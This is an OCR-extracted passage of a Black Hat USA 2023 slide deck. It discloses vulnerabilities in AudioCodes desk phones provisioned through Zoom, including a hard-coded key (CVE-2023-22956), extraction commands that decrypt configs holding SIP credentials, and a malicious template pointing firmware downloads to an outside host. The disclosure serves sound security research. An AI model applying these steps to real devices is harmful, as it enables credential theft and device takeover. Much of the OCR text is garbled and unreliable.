init_cipher: RAND_pseudo_bytes ERROR. Can't generate random salt!
init_cipher: EVP_BytesToKey ERROR. Can't generate key and IV!
init_cipher: EVP_CipherInit ERROR. Can't initialize cipher
Tinal_cipher: Cipher context can't be NULL!
Tinal_cipher: Output buffer can't be NULL!
Tinal_cipher EVP_CipherFinal ERROR
h4dA
Use: %s -f <input Tile name> -o <output Tile name>
Invalid command line parameters.
```

## Slide 64

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
00011626
60011624
00011628
00011 62c
00011636
60011634
60011638
08011 63c
00011646
00011644
00011648
00011 64c
TG
61
08
Gl
18
60
eB
08
41
08
61
3d
47
de
do
20
70
60
11
80
20
60
10
Td
2d
4d
4d
BT
Tf
eg
e?
e2
el
e2
el
ée5
e2
e3
el
ed
eb
FUN 60011620
XREF[1] :
GGeGLOTde
stmdb |,{rd4, 5, r6, r7,
sub .5p,#0x610
sub ,3p,#0x8
cpy :
add ,5p, 80x18
cpy :
ldr , [DAT_06011828]
sub Py, #0x8
mov »#0x41
cpy :
add =>s hddAratH
b1 sEXTERNAL>: : memcpy
```

## Slide 65

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
FUN 60011620 KREF[1] : GOGLETde
06011620 Ta 47 2d ed stmdb Lir4.r3,ré.r7,r8,r9, lr}
GO011624 61 de 4d e2 sub ,sp,.#0x610
00011628 08 dO 4d e2 sub .Sp.#0x8
O601162c O61 50 a0 el cpy :
00011630 18 70 8d e2 add sp, #0x18
60011634 60 60 a0 el cpy :
06011638 e8 11 Sf e5 ldr , [DAT_06011828]
OG801163c G8 86 47 e2 sub 27, 80x8
00011646 41 20 a0 e3 mav ,#0x41
00011644 68 60 a0 el cpy :
06011648 61 10 &f eB add =>s_h4dAratH
QGG1164c 3d fd TT eb b1 sEXTERNAL>: : memcpy
```

## Slide 66

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
BEG11756 Be
BHG117Sc Bs
BEG11768 Ba
GOG117O4 89
6011768 &c
BG
ae
BG
18
fe
8d
ae
ae
ae
ff
e5
el
el
e]
eb
Str
=|
TO, (sp, #0x8)]=>local_638
cpy
=|
lal
=|
cpy
cpy
bl
=|
=|
4
i
=]
FUN_@@@111a8
```

## Slide 67

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
BEG11756 Be
BHG117Sc Bs
BEG11768 Ba
GOG117O4 89
6011768 &c
BG
ae
BG
18
fe
8d
ae
ae
ae
ff
e5
el
el
e]
eb
Str
cpy
cpy
cpy
=|
TO, (sp, #0x8)]=>local_638
=|
lal
=|
=|
=|
4
i
=]
bl
FUN_@@@111a8
```

## Slide 68

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
900111a0 TO
GGG111la4 1
GGG111a8 3
@@@11ilac fc
060111be 6O
@60111b4 62
Af
68
Te
de
ae
be
2d
ae
a
Ad
ae
ae
FUN_@@@111a8
ag stmdb sp!,{r4,r5,16,1
el cpy T6,param_2
el cpy ry, param_4
e2 sub sp, sp, #Oxtc
el cpy rs, param_1
el cpy ril,param_3
XREF [1]:
1.17}
```

## Slide 69

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
900111a0 TO
GGG111la4 1
GGG111a8 3
@@@11ilac fc
060111be 6O
@60111b4 62
Af
68
Te
de
ae
be
2d
ae
a
Ad
ae
ae
FUN _@@@111a8
eg stmdb
el cpy
el cpy
a2 sub
el cpy
el cpy
orf {r4 rS rol rvira -O
ee ee ee oe) Oe LO 15
T6,param_2
ry, param_4
sp, sp, #Oxfc
rs, param_1
ril,param_3
XREF [1]:
1.17}
```

## Slide 70

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
80011218 87 30
BOB1121c 88 98
80011220 64 08
@G011224 14 10
80011228 43 Te
ae
8d
ae
od
TT
el
e5
el
a5
eb
cpy param_4,1r/
str ro, [sp,#local_118]
cpy param_1,r4
ldr param_?,[sp,#local_1@c]
bl <EXTERNAL>: :EVP_BytesToKey
```

## Slide 71

#BHUSA @BlackHatEvents

Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
EVP_BytesToKey
NAME
EVP BytesToKey - password based encryption routine
SYNOPSIS
DESCRIPTION
EVP BytesToKey() derives a key and IV from various parameters. type is the cipher to derive the
key and IV for. md is the message digest to use. The salt parameter is used as a salt in the
derivation: it should point to an 8 byte buffer or NULL if no salt is used. data is a buffer
containing datal bytes which is used to derive the keying data. count is the iteration count to
use. The derived key and IV will be written to key and iv respectively.
Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
```

## Slide 72

#BHUSA @BlackHatEvents

Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
EVP_BytesToKey
NAME
EVP BytesToKey - password based encryption routine
SYNOPSIS
DESCRIPTION
EVP BytesToKey() derives a key and IV from various parameters. type is the cipher to derive the
key and IV for. md is the message digest to use. The salt parameter is used as a salt in the
derivation: it should point to an 8 byte buffer or NULL if no salt is used. data is a buffer
containing datal bytes which is used to derive the keying data. count is the iteration count to
use. The derived key and IV will be written to key and iv respectively.
Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
```

## Slide 73

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
3
Cg
fe}
s_ h4dA
"held Ad
ds
@0011e8T |68 34 64
```

## Slide 74

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
$ offset=$(python3 -c ‘'print(int("@0@@le8f", base=16))')
$ dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1
```

## Slide 75

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
#00111b8 a4 fe ff eb bl <EXTERNAL>: :EVP_des_ede3_cbe
```

## Slide 76

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
$ secret=$(cat secret.bin)
$ openssl enc -des-ede3-cbc -P -pass pass:$secret -nosalt
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
ke y=4ODAG6 1 FARE AA PPA AAA AIEEE HAA AHA
iv =C61l4##4ee4 444 ee4
$ openssl enc -d -des-ede3-cbc -pass pass:$secret -nosalt \
-in encrypted_config.cfx -out plain_config.cfg
$ cat plain_config.cfg
voip/line/@/enabled=1
voip/line/@/id=123
voip/line/@/auth_name=XYZ
voip/line/@/auth_password=XYZ
```

## Slide 77

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» To encrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f <filename>.cfg
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 78

## SYSS-2022-054

- SYSS-2022-054

- CVE-2023-22956

- Use of hard-coded Cryptographic Key (CWE-321)

#BHUSA @BlackHatEvents

## Slide 79

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 80

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 81

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Request
Raw Hex
GET /api/v2/pbx/provisioning/audiocodes/@09038F9D8992.cfg HTTP/2
Host: eu@ipbxacp.zoom.us
User-Agent: AUDC/3.4.6.664 AUDC-IPPhone-C45@HD_UC_3.4.6.684/1
Accept: */*
5 Referer: https://provacp.zoom.us/
lu PAF
fos
```

## Slide 82

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Response
Pretty Raw Hex Render
& Whe
WO oo os) ao in
10
11
12
13
14
15
16
HTTP/? 488 Bad Request
Server: nginx
Date: Sat, @1 Jul 2823 69:35:14 GMT
Content-Type: text/html
Content-Length: 238
Strict-Transport-Security: max-age=315360008; includeSubDomains
<html>
<head>
<title>
40@ No required SSL certificate was sent
</title>
</head>
<body>
<center>
<hil>
40@ Bad Request
</hi>
</center>
<center>
No required SSL certificate was sent
</center>
<hr>
<center>
nginx
</center>
</body>
</html>
#BHUSA @BlackHatEvents
```

## Slide 83

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
File Edit View Go Capture Analyze Statistics Telephony Wireless
AQAOnmT Roe Ces Be 8
Tools Help
S| 2aaaet
[Ml |tcp.stream eq 2
VID Source
1-19 19:38:°06.541412668 192.168.219, 72 41362
1-19 19:38:06.559799768 197.168.219.772 41362
1-19 19:38:06.591670758 3.120.121.92 443
1-19 19:38:06.597166812 3.120.121.92 443
1-19 19:38:06.597542325 192.168.219.772 41362
1-19 19:38:06.601687045 3.120.121.92 443
1-19 19:38:06.602035254 192.168.219,72 41362
1-19 19:38:06.606450996 3.120.121.9 443
1-19 19:38:06. 606762007 9 63 9 4136
1-19 19:38:06.60/7731560 3.120.121.92 443
1-19 19:38:06. 607970085 92. 1bo.219. a
1-19 19:38:06.669141160 192.168.219, 72 41362
1-19 19:38:06. 704012179 3.120.121.92 443
1-19 19:38:06. 704885248 3.120.121.92 443
1-19 19:38:06. 705050588 192.168.219,72 41362
1-19 19:38:06. 706763561 197.168.219.772 41362
4
Content Type: Handshake (22)
Version: TLS 1.2 (@x@303)
Length: 333
~ Handshake Protocol: Serwer Key Exchange
Handshake Type: Server Key Exchange (12)
Length: 329
» EC Diffie-Hellman Server Params
~ Transport Layer Security
~ TLSvi.2 Record Layer: Handshake Protocol: Multiple Handsha
Content Type: Handshake (22)
Version: TLS 1.2 (@x@303)
Length: 81
~ Handshake ProtocoL:| Certificate Request
Handshake Type: Certificate Request (13)
Length: 73
Certificate types count: 3
» Certificate types (3 types)
Signature Hash Algorithms Length: 30
» Signature Hash Algorithms (15 algorithms)
Distinguished Names Length: 35
» Distinguished Names (35 bytes)
~ Handshake Protocol: Server Hello Done
Handshake Tyne: Server Hello Done (14)
Src.Port Destination
Dst.Port Protocol Length Info
3.120.121.92 443 TCP 66 41362 — 443 [ACK]
3.120.121.92 443 TLSvi.2 583 Client Hello
192.168. 219.72 41362 TCP 66 443 . 41362 [ACK]
192.168.219.72 41362 TLSvi.2 1506 Server Hello
3.120.1271.92 443 TCP 66 41362 ~ 443 [ACK] Seq=518 Ack=1441 Win=32128 Len=0 TSval=4294944
192.168.219.72 41362 TCP 1506 443 ~ 41362 [PSH, ACK] Seq=1441 Ack=518 Win=62208 Len=1440 TSvall
3.120,121.92 443 TCP 66 41362 — 443 [ACK] Seg=518 Ack=2881 Win=35008 Len=0 TSval=4294944
192.168 .219.72 41362 TLSvi.2 1506 Certificate
Q : Zé P 66 4136 44 ACK en=0 al=4294944
192.168.219.772 41362 TL5v1i.2 434 Server Key Exchange, - |} = er Hello Done
. ue. ad +4 P OO . u = 44 we =: o Wi 0 SN Va l=4 qay4
3.120,121.92 443 TLSvi.2 1220 Certificate, #6nt Key Exchange, Certificate Verify, Change Cip
192.168.219.772 41362 TCP 66 443 .. 413627ACK] Seq=4689 Ack=1672 Win=61056 Len=@ TSval=305154
192.168. 219.72 41362 TLSvi.2 117 ChanggeCipher Spec, Encrypted Handshake Message
3.120,121.92 443 TCP 66 44662 — 443 [ACK] Seg=1672 Ack=4740 Win=40768 Len=0 TSwal=429494
3.120.171.92 443 TLSv1.2 266 Application Data
lessages
Seq=i Ack=1 Win=29248 Len=0 TSval=4294942974
Seq=1 Ack=518 Win=62208 Len=8 TSval=30515404764
#BHUSA @BlackHatEvents
```

## Slide 84

Source: https://www.audiocodes.com/media/zhre0lg0/c448hd-c450hd-ip-phone-for-microsoft-teams-user-s-and-administrator-s-manual-ver-1-17.pdf

#BHUSA @BlackHatEvents

## Slide 85

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Response
LA fe La PB ee
an
ee ee
Lf WB ee & wo to =]
16
Pretty Raw Hex Render
HTTP/2 208 OK
Date: Sat, @1 Jul 2@23 09:37:33 GMT
Content-Type: application/octet-stream
Content-Length: 6992
X-Zm-Trackingid: PBX_@@b858508acTa584az6703eb5a700b9T
X-Zm-Region: VA
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Frame-Options: deny
Content-Disposition: attachment; Tilename=@8908F9D8992 .cTg
Accept-Ranges: bytes
Strict-Transport-Security: max-age=31536088@; includeSubDomains
X-Content-Type-Options: nosniff
system/type=C45@HD
vVoip/dns_cache/mode=DNS_QUERY_FIRST
Voip/dns_cache_srv/@/name=_sips._tcp.eu@1lsip@g.fr.zoom.us
voip/dns_cache_srv/@/port=5091
voip/dns_cache_srv/@/priority=1
voip/dns_cache_srv/@/target=eu@lsip@g.fr.zoom.us
voip/dns_cache_srv/@/weight=18
voip/dns_cache_srv/1/name=_sips._tcp.eu@lsip@g.fr.zoom.us
voip/dns_cache_srv/1/port=5091
Voip/dns_cache_srv/1/priority=2
voip/dns_cache_srv/1/target=eu@lsip®g.am.zoom.us
Voip/dns_cache_srv/1/weight=18
```

## Slide 86

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Request
Raw Hex
1 GET /api/v2/pbx/provisioning/ audiocodes
2 Host: eu@lpbxacp.zoom.us
hake
4 Referer: https://provacp.zoom.us/
00908F9D8993 .cfg
HTTP /2
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
```

## Slide 87

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Client_00908F9D8992
Identity: Client_OOS08F9D8992
Verified by: CA_ipp1
Expires: 02/12/2037
Subject Name
© (Organization):
CN (Common Name):
ACL
Client_OO908F9D8992
Issuer Name
© (Organization): ACL
CN (CommonName): CA_ipp1
Issued Certificate
Version: 3
Serial Number: @2 @@ 9@ &F 9D 89 92
Not Valid Before: 2017-02-17
Not Valid After: 2037-02-12
```

## Slide 88

### **Pseudo NGINX Configuration**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Pseudo NGINX
Configuration
server
listen 443 ssl
server_name eu@1lpbxacp.zoom.us
ssl_certificate /path/to/server.crt
ssl_certificate_key /path/to/server.key
location /
# m7TLS
ssl_client_certificate /path/to/ca.crt
ssl_verify_client on
# mils
if ($ssl_client_verify != SUCCESS
return 4@3
# X.509 client serial verification
if ($ssl_client_s_dn !~* "CN=$arg_serial"
return 403
# forward
proxy_pass http://localhost:9080
```

## Slide 89

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 90

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
O
co
IT administrator
ZOOM one and assigns
a configuration template
```

## Slide 91

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Add Device
Display Name
Description
(Optional)
[ John Doe
( John Doe's Phone
y
MAC Address [ oogosrsase92 )
Device Type [_Audiocodes S)
[ c450hd S )
Assigned to
This device type supports up to 1 assignee.
Assign
Provision
Template
(Optional)
common user template
Save Cancel
```

## Slide 92

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Company Info > Account Settings >» Desk Phone > Provision Template >» common user template
Name f common user template )
Description default template for devices
(Optional)
Save Cancel
Template Visit Support Document for more guidance
-
| personal_settings/soft_key/O/key_function=DIRECTORY
personal_settings/soft_key/1/key_function=MISSED_CALLS
personal_settings/soft_key/2/key_function=DND_ALL
personal_settings/soft_key/3/key_function=Forward_All
5 personal_settings/soft_key/4/key_function=NONE
oe)
Cancel
#BHUSA @BlackHatEvents
```

## Slide 93

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Company Info > Account Settings » Desk Phone > Provision Template > evil configuration template
evil configuration template rename
No description
Template Visit Support Document for more guidance
( | provisioning/Tirmware/url=https://ptma.sy.gs/pbx/AudioCodes_UCC450HD_3.4.8.198.1.img )
2 provisioning/period/type=weekly
3 provisioning/period/weekly/time=00:00
4 provisioning/random_provisioning_time=300
#BHUSA @BlackHatEvents
```

## Slide 94

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Pretty Raw Hex
1 GET fapl/v2/pbx/provisioning/ Audi oCodes/c450hd/00908F9D8992.cfq HTTP/2
2 Host: euOlpbxacp.zoom.us
3 User-Agent: AUDC/3.4.6,604 AUIDC- TPPhone-C45@HD_LUC 3.4.6.604/1
4 Accept: */*
a
@)o ©) >) | Search...
Response
Pretty Raw Hex Render
ise WuLpy tile 2uy pus
193 voilp/Lline/27/enabled=0
184 voip/line/27/1d=0
195 voip/Line/28/enabled=0
196 voip/line/28/1d=0
197 voip/Lline/29/enabled=0a
198 voip/line/29/1d=0
199 voip/services/msg waiting ind/voice mail number=*86
ZOO) pravisloning/Tirmware/ur ttps://ptma.sy.gs/pbx/AudloCedes UCC4ASOHD 3,.4.8.198.1,.1mg
201) provisioning, period/type=weekLy
202) provisloning/period/weekLy/time=00: 00
203) provisiloning/random provisioning time=300
```

## Slide 95

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Add Device
Display Name yet another phone
Description
(Optional)
a
MAC Address 00908faaaaaa
Device Type AudioCodes w
c450hd wv
This device type supports up to 1 assignee.
Assigned to Assign
Provision common user template
Template
(Optional)
#BHUSA @BlackHatEvents
```

## Slide 96

### **Before MAC assignment**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Raw Hex
1 GET /@@988FAAAAAA HTTP/1.1
2 Host: redirect.audiocodes.com
3 Accept: */*
4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
5 Connection: close
=
Before MAC assignment
Response
Pretty Raw Hex
HTTP/1.1 404 Not Found
Content-Length: 62
Connection: close
Content-Type: application/json: charset=utT-&
Date: Thu, @6 Jul 2023 12:16:48 GMT
Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44e8T5c51b
oom Ln fe Lu Ro Be
ca
{
"description": "device MAC @@9@8FAAAAAA was not found"
}
i
& wo
```

## Slide 97

### **After MAC assignment**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Request
Raw Hex
1 GET /@@988FAAAAAA HTTP/1.1
2 Host: redirect.audiocodes.com
3 Accept: */*
4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
5 Connection: close
=
After MAC assignment
Response
Raw Hex Render
1 HTTP/1.1 382 Found
2 Content-Length: ©
3 Connection: close
4 Content-Type: text/plain; charset=utf-&8
5 Date: Thu, 866 Jul 2023 12:17:08 GMT
6 Location: https://eu®lpbxacp.zoom.us/api/v2/pbx/provisioning/ audiocodes /
ry
Request-Context: appId=cid-v1:229bb6bd-04d7 -408d-b225-c6e440f5c51b
oo
its]
```

## Slide 98

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
3
Cg
fe}
(<)
E
O
O
N
```

## Slide 99

MAC + Config

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
3
Cg
fe}
MAC + Config
(<)
E
O
O
N
```

## Slide 100

MAC + Config

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
3
Cg
fe}
MAC + Config
(<)
E
O
O
N
```

## Slide 101

MAC + Config

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
3
Cg
fe}
MAC + Config
E
O
O
N
```

## Slide 102

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 103

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 20es3
@.' aQudiocodes C450HD \a Home S—= Log Off
Manual firmware upgrade
Configuration | Management # Diagnostics
Please select a file to upgrade.
Firmware File Location: Choose File | AudioCodes....6.604.1.img
+1 | Automatic Update
=| jig) Manual Update vo
Submit
Configuration File
Firmware Upgrade
#1 |) Administration
+ | gj Remote Management
```

## Slide 104

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CC audiocodes
CRC Error
A rade Fail
```

## Slide 105

### /home/ipphone/scripts/run_ramfs_for_upgrade.sh

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
lhome/ipphone/scripts/run_ramfs_for_upgrade.sh
[...]
FLASHER=flasher
[...]
do_upgrade() {
v "Performing system upgrade..."
In -s /home/ipphone/bin/1lcdbar /bin/1cdbar
flasher u /tmp upgrade.img
if [ $? -eq @ ]; then
v "external flasher exist"
chmod +x /tmp/flasher_ext
/tmp/flasher_ext u
if [ $? -eq @ ]; then
v "external flasher can run, so use external flasher to upgrade"
FLASHER="/tmp/flasher_ext"
fi
fi
$FLASHER xr /tmp upgrade.img 1>$CONSOLE 2>&1
if [ $? -eq @ ]; then
v "Upgrade successful"
else
v "Upgrade fail"
fi
#BHUSA @BlackHatEvents
```

## Slide 106

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
undefined
indefined lseek_SEEK_SET()
Te@:1 <RETURN=
lseek_SEEK_SET
00012b38 68 20 a@ e3
@@012b3c fb f9 Tf ea
mov 12, #0x8
<EXTERNAL=: : lseek
XREF [34] :
FUN_@80@11f30:
FUN_00011T30:
FUN_00011T30:
FUN_00011T30:
FUN_00011T30:
FUN_@80@11f30:
FUN_@80@11f30:
FUN_@80@11f40:
FUN_@0011fa4:
FUN_@@@11fa4:
FUN_@@@121bc:
FUN_@@@121bc:
FUN_@@@15038:
FUN_@@@152b8:
FUN_@O@1572c:
FUN_@8@157c4:
FUN_@8015e86:
FUN_@@@15Tac:
FUN_@@@15Tac:
FUN_@@0164b0:
90011a78(c)
g0011ac4(c)
00011bb4(c)
90011d3c(c)
gO01idd4(c)
90011e34(c)
20011e80(c)
90011f50(c)
9801211c(c)
90012190(c)
00012220(c)
900124T4(c)
000151a0(c)
90015448(c)
@001579c (c)
90015814(c)
98015ec8(c)
90015FTO(c)
90016048(c)
9001657c(c)
[more]
```

## Slide 107

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
File Edit Search View Format Scripts Templates Debug Project Tools Window Help
Be Biever '-hROC SEB FS = 5
44 39 05 41 17 00 00 00 50 39 05 41/17 00 00 00 D9.A....P9.A..
54 39 05 41 17 00 00 00 58 39 05 41 17 00 00 00 T9.A....X9.A..
60 39 05 41/17 00 00 00 6C 39 05 41 17 00 00 00 *9.A....19.A..
70 39 05 41 17 00 00 00 74 39 05 41 17 00 00 00 p9.A....t9.A..
7C 39 05 41:17 00 00 00 88 39 05 41 17 00 00 00 {9.A....°9.A..
8C 39 05 41 17 00 00 00 98 39 05 41 17 00 00 00 G9.A....°9.A..
A4 39 05 41.17 00 00 00 A& 39 05 41/17 00 00 00 59.A....°9.A..
AC 39 05 41 17 00 00 00 B4 39 05 41 17 00 00 00 =9.A....°9.A..
CO 39 05 41/17 00 00 00'C4 39 05 41 17 00 00 00 AY.A....A9.A..
C8 39 05 41 17 00 00 00 DO 39 05 41 17 00 00 00 E9.A....D9.A..
D4 39 05 41/17 00 00 00 D8 39 05 41 17 00 00 00 O9.A....09.A..
DC 39 05 41 17 00 00 00 EO 39 05 41 17 00 00 00 UI.A....a9.A..
E4 39 05 41 17 00 00 00 E8 39 05 41 17 00 00 00 a9.A....€9.A..
EC 39 05 41 17 00 00 00 FO 39 05 41 17 00 00 00 i9.A....69.A..
F4 39 05 41/17 00 00 00 F8 39 05 41 17 00 00 00 69.A....09.A..
FC 39 05 41 17 00 00 OO BB BB BB BB 60 00 00 00 U9.A....»»»»*
72 6F 6F 74\66 73 2E 65 78 74 34 00 00 00 00 00 rootfs.ext4.....
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
01 00 00 00 00 00 00 00 3D 3E EF 78 00 50 00 08
00 50 00 08 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00,00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
AN Anh An nn nn nn nn nn nn nn nn nn nn nn nn nn
```

## Slide 108

**Section Magic Bytes Section Header Size**

**Secion Name**

#### **Section Checksum starting at Offset 0x60 (8 Byte alligned)**

#BHUSA @BlackHatEvents

## Slide 109

### Firmware Sections

- Firmware header containing meta information (version, model, date, etc.)

- bootloader.img

- rootfs.ext4

- phone.img

- section.map

- Flasher

- Release

- end.section

#BHUSA @BlackHatEvents

## Slide 110

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
(pmabrett
$ 11
total 3/K
drwxr-xr-x
drwxr-xr-
drwxr
drwxr-xr-
drwxr-xr-
drwxr
drwxr-xr-
drwxr-xr-
-rwxr
drwxr-xr-
drwxr-xr-
drwxr
-rwxr
drwxr
drwxr
-rw-r--r
-rwxr
-rwxr ;
drwxr-xr-x
uTwat=
-rw-r--r
GT WRT
-rwxr
-rwXxr
-rwxr
-rwxr
-rwxr ;
drwxr-xr-x
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root : ] :50 ntpser. List
r root
root root .
root root . ! production.cfg
r root : ] : cal
root root :
root root
root root
root root
root Toot i
root root |
root root . .s
root root . j udhcpc.script.option43
root root : ] : udhcpc.vlanid. script
root . ] udhcpc.wlan0.script
root
™
ee
-X
-X
-X
-X
-X
Oe Se eR PNPM NRE RPP ON PW BNP Whee he ehh OB
```

## Slide 111

